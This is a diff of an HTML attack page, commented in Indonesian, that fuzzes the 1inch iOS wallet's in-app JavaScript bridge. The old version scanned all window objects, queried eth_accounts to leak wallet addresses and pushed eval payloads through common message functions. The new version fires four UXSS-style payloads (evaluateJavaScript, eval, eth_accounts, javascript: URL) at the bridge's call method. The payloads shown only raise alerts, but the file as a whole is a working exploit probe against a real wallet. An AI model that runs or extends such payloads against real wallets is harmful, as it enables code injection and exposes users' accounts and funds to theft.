@@ -1,66 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>DApp Bridge Hunter</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .log { border-bottom: 1px solid #333; padding: 5px 0; }
-        .alert { color: #ff0000; font-weight: bold; }
-        button { background: #00ff00; color: black; border: none; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <h2>-- BRIDGE ATTACKER --</h2>
-    <button onclick="startScan()">MULAI SCAN SEKARANG</button>
-    <div id="console" style="margin-top: 20px;"></div>
+<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
+    <h3>Fuzzing 1inch Bridge...</h3>
+    <div id="logs"></div>
 
     <script>
-        function print(msg, isAlert = false) {
-            const div = document.createElement('div');
-            div.className = isAlert ? 'log alert' : 'log';
-            div.innerHTML = `> ${msg}`;
-            document.getElementById('console').prepend(div);
-        }
+        const target = window.OneInchiOSWallet;
+        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
 
-        function startScan() {
-            print("Memulai pemindaian objek window...");
-            
-            // Daftar objek standar yang kita abaikan
-            const ignore = ['window', 'self', 'document', 'location', 'top', 'frames', 'history', 'navigator'];
+        if (target) {
+            log("Bridge 1inch Terdeteksi!");
 
-            Object.keys(window).forEach(key => {
-                // Cari objek yang bukan bawaan browser standar
-                if (!ignore.includes(key) && window[key] !== null) {
-                    print(`Menemukan Potensi Bridge: <b>${key}</b>`);
+            // Daftar format yang sering digunakan oleh bridge dompet iOS
+            const payloads = [
+                // Format 1: String Eval (Target UXSS utama)
+                JSON.stringify({ method: "evaluateJavaScript", args: ["alert('UXSS_1')"] }),
+                
+                // Format 2: Direct Eval
+                JSON.stringify({ type: "eval", code: "alert('UXSS_2')" }),
+                
+                // Format 3: Request Accounts (Untuk cek kebocoran data alamat)
+                JSON.stringify({ method: "eth_accounts", id: 1 }),
+                
+                // Format 4: Plain string
+                "javascript:alert('UXSS_3')"
+            ];
 
-                    // 1. Coba curi info akun (Common di DApp Browser)
-                    try {
-                        if (window[key].request) {
-                            window[key].request({method: 'eth_accounts'}).then(acc => {
-                                print(`DATA BOCOR! Alamat Dompet: ${acc}`, true);
-                            });
-                        }
-                    } catch(e) {}
-
-                    // 2. Coba kirim payload UXSS (Jika ini jembatan Java Android)
-                    const pocPayload = JSON.stringify({
-                        type: 'eval',
-                        code: 'alert("VULNERABLE: Bridge ' + key + ' bisa mengeksekusi kode!")'
-                    });
-
-                    try {
-                        // Coba berbagai nama fungsi pengirim pesan
-                        const methods = ['process', 'postMessage', 'call', 'send', 'sendMessage'];
-                        methods.forEach(m => {
-                            if (typeof window[key][m] === 'function') {
-                                print(`Mencoba metode: ${key}.${m}()`);
-                                window[key][m](pocPayload);
-                            }
-                        });
-                    } catch(e) {}
+            payloads.forEach((p, i) => {
+                try {
+                    log(`Mencoba Payload #${i+1}...`);
+                    target.call(p); // Mencoba menembak bridge
+                } catch(e) {
+                    log(`Gagal pada #${i+1}: ${e.message}`);
                 }
             });
+        } else {
+            log("Bridge tidak ditemukan. Pastikan dibuka di DApp 1inch.");
         }
     </script>
 </body>
